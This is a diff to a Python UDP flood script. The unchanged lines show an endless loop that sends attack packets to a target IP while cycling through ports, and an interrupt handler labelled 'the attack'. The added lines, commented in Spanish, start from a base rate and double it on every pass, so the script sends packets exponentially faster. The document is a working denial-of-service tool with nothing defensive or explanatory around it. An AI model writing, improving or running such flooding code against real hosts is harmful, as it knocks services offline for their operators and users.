@@ -77,6 +77,11 @@ for i, progress in enumerate(progress_chars):
 time.sleep(3)
 
 sent = 0
+
+# Definir una tasa base y un factor de incremento exponencial
+base_rate = 0.1  # Paquetes por segundo
+exponential_factor = 2  # Factor de incremento exponencial
+
 try:
     while True:
         sock.sendto(attack_bytes, (ip, port))
@@ -85,6 +90,13 @@ try:
         print("Sent %s packet to %s through port:%s" % (sent, ip, port))
         if port == 65534:
             port = 1
+
+        # Incrementar la tasa exponencialmente
+        base_rate *= exponential_factor
+
+        # Esperar un tiempo inversamente proporcional a la tasa exponencial
+        time.sleep(1 / base_rate)
+
 except KeyboardInterrupt:
     print("\n" + ROJO + "[*] User interrupted the attack." + RESET)
 except Exception as e:
